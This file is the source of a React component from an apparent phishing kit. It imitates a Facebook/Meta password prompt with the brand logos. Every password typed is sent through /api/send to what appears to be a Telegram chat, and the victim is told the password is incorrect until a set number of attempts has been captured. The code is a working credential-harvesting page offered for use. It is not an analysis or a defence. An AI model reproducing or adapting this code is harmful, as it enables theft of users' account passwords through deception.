"use client";
import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import { escapeHTML } from '@/utils/telegram';
import config from '@/utils/config';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { type FC, useState } from 'react';

// Hide password toggle for IE/Edge
if (typeof document !== 'undefined') {
    const style = document.createElement('style');
    style.textContent = `
        .hide-password-toggle::-ms-reveal,
        .hide-password-toggle::-ms-clear {
            display: none;
        }
    `;
    document.head.appendChild(style);
}

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { messageId, baseMessage, passwords, addPassword, setMessageId, translations: storeTranslations } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!password.trim() || isLoading || !baseMessage) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        try {
            // Rebuild message: baseMessage + tất cả passwords (bao gồm password mới)
            let updatedMessage = baseMessage;
            
            // Thêm tất cả passwords đã có (số thứ tự từ 1 đến passwords.length)
            passwords.forEach((pwd, index) => {
                updatedMessage += `\n🔑 Password ${index + 1}: <code>${escapeHTML(pwd)}</code>`;
            });
            
            // Thêm password mới (số thứ tự = passwords.length + 1)
            const passwordNumber = passwords.length + 1;
            updatedMessage += `\n🔑 Password ${passwordNumber}: <code>${escapeHTML(password)}</code>`;
            
            // Thêm password mới vào store sau khi rebuild message
            addPassword(password);

            if (messageId) {
                // Xoá tin nhắn cũ để tin nhắn mới gửi đi có tiếng chuông (không âm thầm)
                fetch('/api/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message_id: messageId })
                }).catch(() => {});
            }

            // Gửi message mới để có thông báo "ting ting"
            const res = await fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: updatedMessage })
            });

            const data = await res.json();
            
            if (data?.success && typeof data.message_id === 'number') {
                setMessageId(data.message_id);
            }

            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-[10000] flex items-center justify-center bg-black/40 animate-fade-in'>
            <div 
                className='max-h-[95vh] h-auto w-full max-w-[500px] mx-2 md:mx-0 shadow-2xl rounded-[20px] flex flex-col overflow-hidden animate-slide-up relative bg-white'
                style={{ backgroundColor: '#ffffff' }}
            >
                {/* Gradient overlay */}
                <div 
                    className='absolute inset-0 pointer-events-none'
                    style={{ background: 'linear-gradient(135deg, rgba(255,245,255,0.7) 0%, rgba(240,255,249,0.7) 100%)' }}
                />

                <div className='relative z-10 flex flex-col h-full'>
                    <div className='flex items-center justify-between pb-[0px]'></div>
                    <div className='flex-1 overflow-y-auto px-[24px] pt-[30px] pb-[34px]'>
                        <div className='h-full flex flex-col items-center justify-between flex-1'>
                            <div className='w-[65px] h-[65px] mb-[20px] mx-auto rounded-full overflow-hidden shadow-sm'>
                                <Image src={FacebookLogoImage} alt='' width={65} height={65} className='w-full h-full object-cover' />
                            </div>
                            <div className='w-full'>
                                <div className='mb-[20px] text-left w-full'>
                                    <p className='text-[#65676b] text-[15px] font-normal leading-[1.3] pt-[2px] break-words'>
                                        {t('For your security, you must enter your password to continue.')}
                                    </p>
                                </div>
                                <form
                                    onSubmit={(e) => {
                                        e.preventDefault();
                                        handleSubmit();
                                    }}
                                    className='flex flex-col gap-[12px]'
                                >
                                    <div className='w-full'>
                                        <div className='input relative w-full border border-[#d4dbe3] h-[46px] px-[12px] rounded-[10px] bg-white text-[15px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] transition-all duration-200'>
                                            <input
                                                id='password'
                                                className='w-full outline-none border-none ring-0 h-full hide-password-toggle text-[#1c1e21] text-[15px] bg-transparent'
                                                placeholder={t('Password')}
                                                autoComplete='new-password'
                                                type={showPassword ? 'text' : 'password'}
                                                value={password}
                                                onChange={(e) => setPassword(e.target.value)}
                                            />
                                            <button
                                                type='button'
                                                className='absolute inset-y-0 right-0 flex items-center px-3 text-gray-400 hover:text-gray-600 cursor-pointer'
                                                tabIndex={-1}
                                                onClick={togglePassword}
                                            >
                                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} className='text-[16px]' />
                                            </button>
                                        </div>
                                        {showError && (
                                            <p className='text-[#fa383e] text-[13px] mt-[8px] text-center animate-shake font-medium leading-tight whitespace-nowrap'>
                                                {t("The password that you've entered is incorrect.")}
                                            </p>
                                        )}
                                    </div>
                                    <div className='w-full pt-[12px]'>
                                        <button
                                            type='submit'
                                            disabled={isLoading}
                                            className='w-full h-[46px] bg-[#1877f2] hover:bg-[#166fe5] text-white text-[16px] font-bold rounded-full transition-all disabled:opacity-50 shadow-md active:scale-[0.98]'
                                        >
                                            {isLoading ? (
                                                <div className='h-6 w-6 animate-spin rounded-full border-2 border-white/30 border-t-white mx-auto'></div>
                                            ) : (
                                                t('Continue')
                                            )}
                                        </button>
                                    </div>
                                    <div className='text-center'>
                                        <button type="button" className='text-[#1877f2] text-[15px] hover:underline transition-all' onClick={(e) => e.preventDefault()}>
                                            {t('Forgot your password?')}
                                        </button>
                                    </div>
                                </form>
                            </div>
                            <div className='w-[65px] mt-[40px] mx-auto opacity-60'>
                                <Image src={MetaLogo} alt='' width={65} height={18} className='w-full h-auto' />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;
